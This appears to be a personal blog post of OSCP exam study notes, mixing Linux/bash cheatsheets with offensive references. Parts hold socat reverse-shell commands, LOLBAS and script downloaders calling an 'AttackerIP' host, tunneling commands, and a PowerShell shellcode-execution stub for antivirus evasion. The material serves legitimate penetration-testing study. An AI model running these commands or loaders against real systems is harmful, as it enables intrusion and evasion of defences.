Title: My notes regarding OSCP exam
Category: OSCP
Tags: cheatsheet, exam
Summary: Some references, cheatsheets and thoughts about PWK in general
Date: 17/08/2020 23:00
Modified: 2020-09-06 15:00
Status: published

# Modules summary
-----------------

 No | Title                               | Level out of 5 | Improve
----|-------------------------------------|----------------|--------------------
 1  | Getting comfortable with Kali Linux | 5 IIIII        |
 2  | Command line fun                    | 5 IIIII        |
 3  | Practical tools                     | 4 IIII         | socat
 4  | Bash scripting                      | 5 IIIII        |
 5  | Passive information gathering       | 4 IIII         | tooling
 6  | Active information gathering        | 4 IIII         | thorough cheatsheet
 7  | Vulnerability scanning              | 2 II           | nessus
 8  | Web application attacks             | 5 IIIII        |
 9  | BOs in general                      | 5 IIIII        |
 10 | BOs in Windows                      | 4 IIII         | tooling (mona)
 11 | BOs in Linux                        | 4 IIII         | tooling (gdb?)
 12 | Client side attacks                 | 4 IIII         | thorough cheatsheet
 13 | Locating public exploits            | 5 IIIII        | dorks
 14 | Fixing exploits                     | 5 IIIII        |
 15 | File transfers                      | 4 IIII         | LOLBAS/BINS
 16 | AV Evasion                          | 3 III          | tooling + cheatsheet
 17 | Privilege escalation                | 3 III          | thorough cheatsheet
 18 | Password attacks                    | 4 IIII         | cheatsheet
 19 | Port redirection and tunneling      | 4 IIII         | tooling, diagrams
 20 | AD attacks                          | 3 III          | grok
 21 | MSF                                 | 4 IIII         | MSF Unleashed
 22 | Powershell Empire                   | 3 III          | practice

For general methodology reference it will be great to examine:

 * [OSSTMM 3](/cstatic/osstmm-3.pdf)
 * [OWASP testing guide v4](/cstatic/owasp-tg-4.pdf)

# Getting comfortable with Kali Linux
-------------------------------------

The very basics I've already known. Short reference for completeness:

 Command   | Purpose
-----------|--------------------------------------------------------------------
 find      | swiss knife for finding files, see below for reference
 locate    | find files using internal file index, just easy as `locate <TERM>`
 systemctl | manage systemd services
 apt       | package manager
 dpkg      | manage packages directly, eg list or install

### `find` cheatsheet
General syntax: `find <path> [conditions] [actions]`  
Some useful `find` predicates to use in conditions:

Predicate                   | Explanation
----------------------------|-----------------------------------------------------------
-atime 0                    | Accessed between now and -24 hours from now
-atime +0                   | Accessed more than 24 hours ago
-atime 1                    | Accessed between 24-48 hours ago
-atime +1                   | Accessed more than 48 hours ago
-ctime -5h15m               | File status changed within the last 5 hours and 15 minutes
-mtime +1w                  | Last modified more than one week ago
-name 'pattern'             | Match item name, iname for CI comparison
-type f|d|l                 | Match item type: file, dir, symlink
-depth N                    | At least N+1 levels deep
-regex 'pattern'            | Match item name
-size 5                     | Exactly 5 512-bits blocks size
-size -128c                 | LT 128 bytes
-size 1440k                 | = 1440KiB
-size +10M                  | GT 10MiB
-size +2G                   | GT 2GiB
-newer FILE                 | Modified newer that FILE
-newer\[c\|m\|B\]\[t\] FILE | [c]hanged, [m]odified, [B]created newer than FILE, use [t]imestamp optionally (eg '1 minute ago')
-user USER                  | Belongs to the USER
-group GROUP                | Belongs to the GROUP
-perm +XXXX                 | Items with XXXX permissions bits set. +4000 for SUID, +2000 for SGID

Useful actions include `-exec`, `-print`, `-delete` and `-ls`, those are self-explanatory.  

Handy oneliners:

CMD                                                                 | Explanation
--------------------------------------------------------------------|------------------------------------
`find / type -f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;` | Find all SUID/SGID files under `/`
`find / type -f -not -name "*.html"`                                | Negate `-name` predicate

# Command line fun
------------------

Overlaps a bit with previous section, pretty much an intro in coreutils and 
other useful tools and configuration envars.  
Compiled a little cheatsheet:

CMD                   | Explanation
----------------------|------------------------------------------------------------------
wget RESOURCE -O FILE | Fetch from web RESOURCE into local FILE. Do not confuse with `-o`
curl -o RESOURCE      | The same as above but with cURL
axel -o RESOURCE      | The same as abot but with axel (using multiple connections)
netstat -antu         | Show TCP/UDP connections
ss -antup             | Show TCP/UDP connections with process info
lsof -i               | Show established TCP connections
who -a                | Logged in users
last -a               | Last logged in users

# Practical tools
-----------------

### Tools list:

 * [Netcat](https://www.opennet.ru/man.shtml?topic=netcat&category=1&russian=2)
 * [Powercat](https://github.com/besimorhino/powercat)
 * [socat](https://linux.die.net/man/1/socat)
 * [wireshark](https://www.wireshark.org/)
 * [tcpdump](https://www.tcpdump.org/manpages/tcpdump.1.html)
 * [ngrep](https://linux.die.net/man/8/ngrep)

Netcat cheatsheet is on another page. Also remember to make connections fully interactive
by using `pty` python module and `stty` or by some other means like using socat/ssh. 
[Powercat](https://github.com/besimorhino/powercat) is very similar to netcat.

### Socat reference:

 * File transfer:  
   `socat TCP4-LISTEN:PORT,fork file:INFILE` on server  
   `socat TCP4:IP:PORT file:OUTFILE,create` on client
 * Encrypted reverse shell:  
   `openssl req -newkey rsa:2048 -nodes -keyout KEYFILE -x509 -days 365 -out CERTFILE` to generate keypair  
   `cat KEYFILE CERTFILE > PEMFILE` to make PEM out of this  
   `socat OPENSSL-LISTEN:PORT,verify=0,cert=PEMFILE STDOUT` establish listener  
   `socat OPENSSL:IP:PORT,verify=0 exec:cmd.exe,pipes` send shell (Windows)  
 * Interactive socat shell:  
   `socat file:'tty',raw,echo=0 TCP-LISTEN:PORT` establish listener  
   `socat EXEC:'bash -li',pty,stderr,setsid,sigint,sane TCP:IP:PORT` send shell  

### tcpdump
```bash
tcpdump port 5060 # capture on port
tcpdump port 5060 or port 5061 # capture on multiple ports
tcpdump portrange 5060-5070 # capture traffic on range of ports
tcpdump host 192.168.1.1 # capture from/to host
tcpdump -any net 192.168.1.0/24 # capture from network
tcpdump -D # show ifaces
tcpdump -i any # capture on all ifaces
tcpdump -i eth0 -c 10 # capture first 10 packets on eth0, then exit
tcpdump -i eth0 -A # capture on eth0, print in ASCII
tcpdump -i eth1 -XX # capture on eth0, print in both HEX ad ASCII with ethernet header
tcpdump -i eth0 -w capture.txt # output to capture.txt
tcpdump -r file.txt # read and analyze capture from file.txt
tcpdump -n -i eth0 # do not resolve domain names
tcpdump -nn -i eth0 # do not resolve domain names or port names
tcpdump -i eth0 -s 100 # capture 100-bytes chunks only, set 0 for unlimited size
tcpdump -i eth0 -t # capture on eth0, print human-readable timestamps
tcpdump -i eth0 -c 10 -w file.pcap tcp # capture TCP packets only
tcpdump http # filter traffic based on a port number for service
tcpdump -S http # show entire packet
tcpdump -d file.pcap # display pcap in human readable form
tcpdump -I eth0 # set iface to monitor mode
tcpdump -L # display data link types for iface[s]
```
Protocols: `ether`, `fddi`, `icmp`, `ip`, `ip6`, `ppp`, `radio`, `rarp`, `slip`, `tcp`, `udp`, `wlan`.

Common filtering commands:

 * `src / dst host <NAME|IP>` filter by source/dest hostname or IP
 * `src / dst net <CIDR>` filter by subnet
 * `tcp / udp src / dst port <PORT>` filter TCP/UDP packets by port and destination
 * `tcp / udp src / dst port range <RANGE>` filter TCP/UDP packets by port range and destination
 * `ether / ip broadcast` filter for ethernet or IP broadcasts
 * `ether / ip multicast` filter for ethernet or IP multicasts

Common logical operators apply: `and`, `&&`, `or`, `||`, `not`, `!`, `<`, `>`, `<=`, `>=`, `=`.

# Bash scripting
----------------

A little bit of syntactic cheatsheet.  
### Conditionals
```bash
if [[ <COND> ]]; then
    echo "true"
elif [[ <ELCOND> ]]; then
    echo "elif"
fi

case "$var" in
    "$cond1" ) # action 1 ...
    ;;
    "$cond2" ) # action 2 ...
    ;;
esac
```

### Tests

Test                    | Explanation
------------------------|-----------------------------------------------
-a FILE                 | FILE exists
-b FILE                 | FILE exists and is a block special file
-c FILE                 | FILE exists and is a character special file
-d FILE                 | FILE is a directory
-e FILE                 | FILE exists
-f FILE                 | FILE exists and is regular file
-g FILE                 | FILE exists and is set-group-id
-h FILE                 | FILE exists and is a symlink
-k FILE                 | FILE exists and its sticky bit set
-p FILE                 | FILE exists and is a pipe
-r FILE                 | FILE exists and readable
-s FILE                 | FILE exists and has size GT zero
-t FD                   | FD file description is open and refers to a terminal
-u FILE                 | FILE exists and set-user-id bit set
-w FILE                 | FILE exists and is writable
-x FILE                 | FILE exists and is executable
-G FILE                 | FILE exists and owned by effective gid
-L FILE                 | FILE exists and is a symlink
-N FILE                 | FILE exists and was modified since it was last read
-O FILE                 | FILE exists and is owned by effective uid
-S FILE                 | FILE exists and is a socket
FILE1 -ef FILE2         | if FILE1 and FILE2 refer to same device and inode
FILE1 -nt FILE2         | if FILE1 is newer that FILE2, or FILE1 exists, and FILE2 does not
FILE1 -ot FILE2         | as above, but older instead of newer
-o OPTNAME              | if shell option OPTNAME is enabled
-v VARNAME              | if shell variable VARNAME is set
-R VARNAME              | if shell variable VARNAME is set and is a name ref
-z STR                  | if length of string STR is non-zero
S1 == S2 or S1 = S2     | if strings S1 and S2 are equal, one eq sign with `test` is POSIX conformant
S1 != S2                | if strings S1 and S2 are not equal
S1 < S2                 | if S1 sorts before S2 lexicographically
S1 > S2                 | if S1 sorts after S2 lexicographically
A1 OP A2                | arith comparison, OP in `-eq`, `-ne`, `-lt`, `-le`, `-gt`, `-ge`

### Brace expansion  
```bash
{A,B}     # Same as A B
{A,B}.foo # Same as A.foo B.foo
{1..5}    # same as 1 2 3 4 5
```

### Parameter expansion  
```bash
name="John"
echo ${name}         # echo name as is
echo ${name/J/j}     # jonh (substitute J with j)
echo ${name:0:2}     # Jo (slice)
echo ${name::2}      # Jo (slice)
echo ${name::-1}     # Joh (slice from back)
echo ${name:(-1)}    # n (slice from back)
echo ${name:(-2):1}  # h (slice from back)
echo ${food:-Cake}   # $food or Cake if unset or empty
len=2
echo ${food::len}    # Jo
STR="/foo/bar/baz.cpp"
BASE=${STR##*/}      # baz.cpp (basepath)
BASE=${STR%$BASE}    # /foo/bar/ (dirpath)

${FOO%suffix}        # remove suffix
${FOO#prefix}        # remove prefix
${FOO%%suffix}       # remove long suffix
${FOO##prefix}       # remove long prefix
${FOO/from/to}       # replace first match, from => to
${FOO//from/to}      # replace all matches, from => to
${FOO/%from/to}      # replace suffix
${FOO/#from/to}      # replace prefix
${#FOO}              # length of $FOO

${FOO:-val}          # $FOO or val if unset or empty
${FOO:=val}          # set $FOO to val if unset or empty
${FOO:+val}          # val if $FOO is set and not empty
${FOO:?msg}          # show error msg if $FOO is unset or empty

$STR="HELLO"
echo ${STR,}         # hELLO (lowercase 1st char)
echo ${STR,,}        # hello (lowercase all chars)

$STR="hello"
echo ${STR^}         # Hello (uppercase 1st char)
echo ${STR^^}        # HELLO (uppercase all chars)
```

### Loops  
```bash
# basic for loop
for i in /foo/bar/*; do
    echo $i
done

# arithmethic c-alike loop
for ((i = 0; i < 100; i++)); do
    echo $i
done

# range loops
for i in {1..5}; do
    echo $i
done

# range with step size
for i in {1..10..2}; do
    echo $i
done

# endless loop
while true; do
   # ...
done
```

### Reading lines  
```bash
cat file.txt | while read line; do
    echo $line
done
```

### Functions  
```bash
# basic
func() {
    echo "hi"
}

# args
func() {
    echo "hi $1"
}

# returning vals
func() {
    local res='result'
    echo $res
}
res="$(func)"

# errors
func() {
    return 1
}
if func; then
    echo "success"
else
    echo "fail"
fi
```

### Arguments  
```bash
$# # number of arguments
$* # all arguments
$@ # all arguments starting from first
$1 # first argument
$_ # last argument of the previous command
```

### Arrays
```bash
FRUITS=('Apple' 'Banana' 'Orange')    # define an array
FRUITS[0]                             # "Apple"
FRUITS=("${FRUITS[@]}" 'Watermelon')  # push elem
FRUITS+=('Watermelon')                # push elem
FRUITS=( ${FRUITS[@]/Ap*/} )          # remove matching
unset FRUITS[2]                       # remove by index
FRUITS=("${FRUITS[@]}")               # duplicate
FRUITS=("${FRUITS[@]}" "${MEALS[@]}") # concat
LINES=(`cat "file.txt"`)              # read from file

${FRUITS[-1]}                         # last elem
${FRUITS[@]}                          # all elems, space separated
${#FRUITS[@]}                         # num elements
${#FRUITS}                            # len of first elem
${#FRUITS[N]}                         # len of Nth elem
${FRUITS[@]:3:2}                      # range from 3th, take 2
${!FRUITS[@]}                         # keys of all elems

# iterate over
for i in "${FRUITS[@]}"; do
    echo $i
done
```

### Dictionaries
```bash
declare -A foo        # define dict
foo[dog]="bark"       # set elem
foo[cow]="moo"
foo[bird]="tweet"
foo[wolf]="howl"
${foo[dog]}           # bark
${foo[@]}             # all values
${!foo[@]}            # all keys
${#foo[@]}            # num elems
unset foo[dog]        # delete by key

# iterate over vals
for v in "${$foo[@]}"; do
    echo $v
done

# iterate over keys
for k in "${!foo[@]}"; do
    echo $k
done
```

# Passive information gathering
-------------------------------
Some great tools and resources:

 * [Osintframework](https://osintframework.com/)
 * [SecurityHeaders](https://securityheaders.com/)
 * [Shodan](https://www.shodan.io/)
 * [SSLTest](https://www.ssllabs.com/ssltest/)
 * [Netcraft](https://www.netcraft.com/)
 * Google dorks, check out exploit-db page
 * [recon-ng](https://tools.kali.org/information-gathering/recon-ng)
 * [theHarvester](https://tools.kali.org/information-gathering/theharvester)
 * whois
 * [gitrob](https://github.com/michenriksen/gitrob)
 * [twofi](https://tools.kali.org/information-gathering/twofi)
 * [osrframework](https://tools.kali.org/information-gathering/osrframework)

An interesting google dorks [cheatsheet](https://www.sans.org/security-resources/GoogleCheatSheet.pdf) by SANS.  
[Recon-ng cheatsheet](/cstatic/recon-ng-cheatsheet.pdf) from Black Hills security

# Active information gathering
------------------------------
 * [dig cheatsheet](/cstatic/dig-cheatsheet.pdf)
 * [SANS nmap cheatsheet](/cstatic/sans-nmap-cheatsheet.pdf)
 * A great [resource](https://book.hacktricks.xyz/pentesting/7-tcp-udp-pentesting-echo) to refer sometimes, useful in general, info about services
 * Some other dude's [cheatsheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#enumeration) about AD
 * Huge [list](https://ss64.com/nt/) of windows command line tools references
 * [Impacket tools](https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/) overview
 * Not a cheatsheet, more like a comprehensive read - [nmap book online](https://nmap.org/book/toc.html)
 * Great [reference](http://0daysecurity.com/penetration-testing/enumeration.html) about service enumeration
 * Another comprehensive [one](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/) from highoncoffee

# Vulnerability scanning
------------------------
Did not spend much time on this since those tools looks trivial to use and I had troubles acquiring
activation code for nessus on my email. Should I have to take a look at it, I'll refer to the
official [docs](https://docs.tenable.com/Nessus.htm).

# Web application attacks
-------------------------
Seems like most prevalent web app vulnerabilities in labs were SQLi, XSS, path traversal and LFI/RFI.
Those were known to me by [WAHH](https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470)
and most times I didn't see any challenging exploitations here. WAHH also contains some useful references, like
for SQLi in many RDMS like MySQL, Oracle or SQL Server. I used them a bit throughout the labs since I have printed
variant of this book in handy. 

Some useful tools to take a closer look include nikto, beef, wafw00f (optional), whatweb, wpscan. 

# Buffer overflows in general
-----------------------------
I was already familiar with concepts, mostly because of [art of exploitation](https://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441)
which is a great intro for complete noobs like me. PWK brought some methodology here on how to write simple exploits for BOs:

 1. Reproduce the crash
 2. Locate IP offset
 3. Locate space for exploit code
 4. Find out what badchars should be avoided
 5. Find value for IP so that it will allow us to execute shellcode
 6. Make payload (eg with msfvenom), add some nops if needed
 7. Refine exploit code (optionally)

Additional and somewhat advanced to this course aspects of study include:

 * [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)
 * [DEP](https://en.wikipedia.org/wiki/Executable_space_protection#Windows)
 * [CFG - control flow guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard)
 * Known, but will list it also - [stack canaries](https://ctf101.org/binary-exploitation/stack-canaries/)

# Buffer overflows: Windows
---------------------------
The most unknown part was `mona.py`, so here is some cheatsheets and docs:

 * [cheatsheet from namishelex01](https://gist.github.com/namishelex01/81d70cb7d51236405731271ed72cf67d)
 * [man from the Corelan team (creators)](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)
 * [lots of cool manuals](https://www.corelan.be/index.php/articles/) from Corelan team

# Buffer overflows: Linux
-------------------------
Almost is the same there, only differs in tooling. Course rely on [edb](https://github.com/eteran/edb-debugger) which
is pretty similar to OllyDbg on Immunity. I guess it would be great to play around with some omnipotent tools like gdb.
Here's a simple [cheatsheet](/cstatic/gdb-cheatsheet.pdf) for it.

# Client side attacks
---------------------
Pretty much terra incognita for me, there were some gotcha moments. I was also surprised that some course boxes had this
vector of attack and indeed got at least one using client side attack. THis is pretty much related to social engineering
and includes dodgy methods like macro docs, malicious HTA, DDE in office documents. A great trick is how to bypass
protected view by using publisher app. [CSA](https://www.offensive-security.com/metasploit-unleashed/client-side-attacks/)
module in Metasploit Unleashed looks promising. This entire topic is more like about thinking out of the box, instead
of being super-technical, hence it looks hard to compile some sort of cheatsheet about it.

# Locating public exploits
--------------------------
Another somewhat non-technical skill that required a bit of luck and skill to made some proper search engine queries.
Great tools and resources to look for exploit code are:

 * [exploit db](https://www.exploit-db.com/) - remember about papers
 * [searchsploit](https://www.exploit-db.com/searchsploit) utility
 * [packetstorm](https://packetstormsecurity.com/files/tags/exploit/)
 * search engine dorks of course
 * though does not seem to contain exploits, but could be very useful - [cvedetails](https://www.cvedetails.com/)

# Fixing exploits
-----------------
Fixing exploits is more or less as fixing regular software. You have to use cross-compilers, debuggers in extreme cases,
printf-based debugging and other similar trivial things to make it work. Was not hard to me at all because of my
experience as a software developer. Also remember that some exploits might be very concerned about environment 
(eg shell) and could not work in some corner cases like then shell is not fully interactive. In other words, sometimes
to fix the exploit does not mean to change it's code or compile with another set of command line arguments.

# File transfers
----------------
A huge topic that includes a lot of instruments throughout various platforms. Those instruments vary between the ones
whose whole purpose is to serve for this (like wget) to some dodgy ones like from LOLBAS (hello certutil.exe). Major
point is to try to use only native tools, to reduce footprint on the target and to decrease chances of possible AV 
detection, since some vendors may detect various tools as a riskware. An alternative of LOLBAS in NIX world is 
[GTFOBINS](https://gtfobins.github.io/) project.  
Sometimes it might be useful to convert file for some other representation, there are some tools to ease this like
`exe2hex` which could convert binary exe to batch file or powershell file and allow to restore it's original state
using these generated scripts. Remember about binary and text mode while working with FTP since binary files like
executable one could be corrupted if sent using ascii mode. 

Some useful approaches:

 * Using powershell and webserver to download: `powershell (New-Object System.Net.WebClient).DowloadFile('<URI>', '<OUTFILE>')`
 * Using powershell to upload: `powershell (New-Object System.Net.WebClient).UploadFile('<URI>', '<INFILE>')`
 * Using tftp: `tftp.exe -i <SRV> PUT <INFILE>`
 * Using certutil to download: `certutil.exe -urlcache -f "<URI>" <OUTFILE>`
 * Using bitsadmin to download: `bitsadmin /transfer debjob /download /priority normal <URI> <OUTFILE>`
 * Using simple PHP app to receive files, could be used with `UploadFile` powershell method from above:
```php
    <?php
    $updir = '/tmp/upload_dir';
    $upfile = $updir . $FILES['file']['name'];
    move_uploaded_file($_FILES['file']['tmp_name'], $upfile);
    ?>
```
 * webserver with python3: `python -m http.server <PORT>`
 * FTP server with python (external package): `python -m pyftpdlib`
 * simple DAV server with nginx, use config:
```nginx
    server {
        listen 8421 default_server;
        location / {
            root /dev/shm;
                dav_methods PUT;
        }
    }
```
 * Spin up FTP server (pure-ftpd):
```bash
    groupadd ftpusers
    useradd -g ftpusers -d /dev/null -s /etc ftpuser
    pure-pw useradd ftp -u ftpuser -d /var/ftp
    pure-pw mkdb
    cd /etc/pure-ftpd/auth/
    ln -s ../conf/PureDB 60pdb
    mkdir -p /var/ftp
    chown ftpuser:ftpusers /var/ftp
    systemctl restart pure-ftpd
```
 * Connect from windows using FTP script file. The main caveat is the lack of space character after user and password:
<pre>
echo open &lt;SRVADDR&gt; > ftp.txt
echo ftpuser>> ftp.txt
echo ftppass>> ftp.txt
echo bin >> ftp.txt
echo get nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
</pre>
 * There's a useful impacket script to run simple SMB server: `python smbserver.py sharename /foo/bar/baz.exe`
 * Handy batch script to drop VBS scenario that may download files from web server. Invoke as `cscript wget.vbs <URI> <OUTFILE>`:
```batch
    echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
    echo StrFile = WScript.Arguments.Item(1) >> wget.vbs 
    echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs 
    echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs 
    echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
    echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs 
    echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs 
    echo  Err.Clear >> wget.vbs 
    echo  Set http = Nothing >> wget.vbs 
    echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs 
    echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
    echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
    echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
    echo  http.Open "GET", strURL, False >> wget.vbs 
    echo  http.Send >> wget.vbs 
    echo  varByteArray = http.ResponseBody >> wget.vbs 
    echo  Set http = Nothing >> wget.vbs 
    echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs 
    echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs 
    echo  strData = "" >> wget.vbs 
    echo  strBuffer = "" >> wget.vbs 
    echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs 
    echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
    echo  Next >> wget.vbs 
    echo  ts.Close >> wget.vbs
```
 * BSD fetch to get files from web resources: `fetch -o /var/tmp/file "http://AttackerIP/file"`
 * python script for the same purpose:
```python
    #!/usr/bin/python 
    import urllib2 

    u = urllib2.urlopen('http://AttackerIP/file') 
    localFile = open('local_file', 'w') 
    localFile.write(u.read()) 
    localFile.close()
```

# Antivirus evasion
-------------------
Another section where I indeed had some theorethical background but was lacking practical experience.
It does not seem to be a cornerstone of this course, more like useful additional for rookies so that
they get in touch with real-world alike scenarios. Some well-known methods to sneak include:

 * packers
 * obfuscators
 * cryptors
 * protectors (enigma, vmp)
 * in-memory injections
 * reflective dll loading
 * process hollowing and doppelganging
 * inline hooks

Though these methods could easily bypass signature detections, one should be afraid of heuristics
and behavioral detections like HIPS. There's some great tools that allow one to obfuscate 
malicious binaries or scripts: [veil 3](https://github.com/Veil-Framework/Veil), 
[shellter](https://www.shellterproject.com/download/) (able to add malicious payload to benign binary),
metasploit encoders and stagers, ability to use powershell winapi interops.  
Some [useful powershell scripts](https://github.com/PowerShellMafia/PowerSploit/tree/master/CodeExecution) are
available in powersploit repository.
Naive shellcode exection script may be as follows (somewhat simpler than ones from powersploit):
```powershell
$code = '
[DllImport("kernel32.dll"]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, 
    uint dwSize, 
    uint flAllocationType, 
    uint flProtect);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, 
    uint src, 
    uint count);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreatAttributes, 
    uint dwStackSize, 
    IntPtr lpStartAddress, 
    IntPtr lpParameter, 
    uint dwCreationFlags, 
    IntPtr lpThreadId);';

$imports = Add-Type -memberDef $code -Name 'Win32' -Namespace Imports -passthru;

[Byte[]]$sc = @(0x0) # a place for the shellcode

$size = 0x1000;

if ($sc.Length -gt 0x1000) { $size = $sc.Length }

$buffer = $imports::VirtualAlloc(0, $size, 0x3000, 0x40);

for ($i = 0; $i -lt $sc.Length; $i++) { 
    $imports::memset([IntPtr]($buffer.ToInt32() + $i), $sc[$i], 1);
}

$imports::CreateThread(0, 0, $buffer, 0, 0, 0);
for (;;) { Start-Sleep 60 };
```
Have [shellter tips](https://www.shellterproject.com/tipstricks/) in handy.  

# Privilege escalation
----------------------
Massive and probably most unknown topic for me. Concepts may seem to be quite straightforward,
but total lack of experience slowing process down significantly. As almost every activity in
red teaming, PE highly relies on thorough enumeration, basically it is not possible to gain
privileged shell without it. There's gazillion of ways to elevate privileges on the boxes and
every little detail about environment might be crucial.  

What might be checked on linux/nix-alike systems manually:

 * `sudo -l` should be the first command issued in the enumeration!
 * get user info - `whoami`, `groups`, `id`, content of `/etc/passwd`
 * executable suid and sgid files
 * dumb world or user writable `/etc/password` is an instant root (have been seen)
 * `chmod` and `chown` is an instant root because of ability to set suid or sgid perms (have been seen)
 * host info may provide useful info - `hostname`, `/etc/issue`, `cat /etc/*-release`, `uname -a`, `arch`
 * running processes - `ps axu`
 * network info:
    1. `ifconfig`, `ip a`
    2. `netstat -antu`, `ss -antp`
    3. `route`, `routel`
 * firewall data like readable iptables configs somewhere under `/etc`, `firewalld` data if available
 * cron jobs and logs, [pspy](https://github.com/DominicBreuker/pspy) is quite useful, `/etc/cron.*`, 
   `/etc/crontab`, `crontab -e`
 * installed software - `dpkg -l`, `rpm -qa`
 * interesting world or user writable directories and files - `find / -type f -writable 2>/dev/null` (files)
 * unmounted partitions, check `mount`, `/etc/fstab`, `lsblk`
 * kernel modules - `lsmod`, `modinfo`
 * check envars - `env`

On windows the list is almost the same, but some commands are sound different:

 * get user info - `whoami`, `whoami /groups`, `net user`. If user is in admin group, the you've done well
 * host info - `hostname`, `systeminfo`, `ver`
 * running processes - `tasklist /svc`
 * network info - `ipconfig /all`, `route print`, `arp -a`, `netstat -aon -p tcp|udp`
 * firewall settings
    1. `netsh advfirewall show currentprofile`
    2. `netsh advfirewall show rule name=all`
 * scheduled tasks - `schtasks /query /fo LIST /v`
 * apps and patches - `wmic product get name,version,vendor`, `wmic qfe get Caption,Description,HotFixID,InstalledOn`
 * world/user writable catalogs - `accesschk -uws "Everyone" C:\`, `Get-Acl`
 * unmounted partitions - `mountvol`
 * drivers - `driverquery /v /fo csv`, `Get-WmiObject Win32_PnPSignedDriver`
 * autoelevate in app manifest
 * alwaysinstallelevated - `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` or in HKCU
 * unquoted service paths - `sc qc`

Automatic enumeration:

 * [PEAS Suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) for Windows and Mac
 * [unix privesc check](https://github.com/pentestmonkey/unix-privesc-check) (somewhat old)
 * [linEnum](https://github.com/rebootuser/LinEnum)
 * [windows privesc check](https://github.com/pentestmonkey/windows-privesc-check)

Also TJNull has some [good section](https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html#section-9-privilege-escalation)
about privesc in his exam guide, there's a lot of references.  
There are also two paid and highly acclaimed courses on udemy made by Tib3rius: for [windows PE](https://www.udemy.com/course/windows-privilege-escalation/)
and for [linux](https://www.udemy.com/course/linux-privilege-escalation/)

# Password attacks
------------------
I was a bit familiar with this one, except the part about wordlist generation, like using `cewl` and process results with JTR rules later. 
The module is no rocket science, one thing to follow in ideal case is to try to use minimal possible wordlist.
Beware of lockout policies that may be enforced. Also sometimes it is not necessary to crack password if we could use pass-the-hash or some similar
technique. Tools include:

 * `cewl`, `twofi` to make some wordlist from web resorce or twitter
 * `hydra`, `medusa`, `patator`, `crowbar` (great for RDP) and `spray` for bruteforcing service accounts
 * `mimikatz`, `pwdump`, `fgdump`, `wce` for dumping passwords from windows system. Former three are for old versions like XP
 * `hashid` to guess hash type
 * `crunch` to generate wordlist, `hashcat` also could iterate over wordlist generated by pattern

# Port redirection and tunneling
--------------------------------
Another familiar section, all about port redirections and establishing pivots through compromised boxes. 
Tools include `ssh` (swiss knife), [sshuttle](https://github.com/sshuttle/sshuttle), `rinetd`, `chisel`, `plink.exe`, `netsh`, 
`proxychains`, `httptunnel`, `stunnel` and some modules from `beef framework`. Some useful commands:

<pre>

    # ssh local port forwarding
    ssh -N -L LPORT:RHOST:RPORT SSHSRV
    ssh -N -L 445:172.16.160.5:445 usr@192.168.119.1 # forward from localhost:443 via 192.168.119.1 to 172.16.160.5:445

    # ssh remote port forwarding
    ssh -N -R RHOST:RPORT:LHOST:LPORT SSHSRV
    ssh -N -R 192.168.1.1:2222:127.0.0.1:3322 usr@192.168.1.1 # will forward from 127.0.0.1:3322 to remote 2222, look like rev shell

    # ssh dynamic port forwarding
    ssh -N -D LHOST:LPORT SSHSRV
    ssh -N -D 127.0.0.1:8081 192.168.160.2 # forward all the incoming traffic via 192.168.160.2 via 8081 (socks)

    # plink.exe remote port forwarding
    plink -ssh -l USR -pw PWD -R RHOST:RPORT:LHOST:LPORT SSHSRV
    cmd /c echo y | plink -ssh -l user -pw pass -R 192.168.2.1:53306:127.0.0.1:3306 192.168.2.1

    # add port forward with netsh
    netsh interface portproxy add v4tov4 listenport=LPORT listenaddress=LHOST connectport=RPORT connectaddress=RHOST

    # add firewall rule
    netsh advfirewall rule add name=NAME protocol=PROTO dir=DIRECTION localip=LADDR localport=LPORT action=ACTION
    netsh advfirewall rule add name="test" protocol=TCP dir=in localip=192.168.1.2 localport=8081 action=allow

    # httptunnel usage: set listener and connect client
    hts --forward-port LHOST:LPORT1 LPORT2
    hts --forward-port 127.0.0.1:8888 1234 # forward incoming from 1234 to 8888
    htc --forward-port LPORT RHOST:RPORT
    htc --forward-port 8081 192.168.1.1:1234 # forward incoming on 8081 to 192.168.1.1:1234

    # psexec call arbitrary binary (eg nc)
    psexec.exe -accepteula -u USR -p PWD SERVERSHARE CMD CMDARGS

    # chisel usage: set server and connect client
    chisel server -P LPORT --socks5 --key KEY
    chisel client RHOST:RPORT socks # connect to remote server on LPORT from above

</pre>

When in doubt and need some pics, go to the [abatchy's post on this](https://www.abatchy.com/2017/01/port-forwarding-practical-hands-on-guide)
or [this one](https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/)

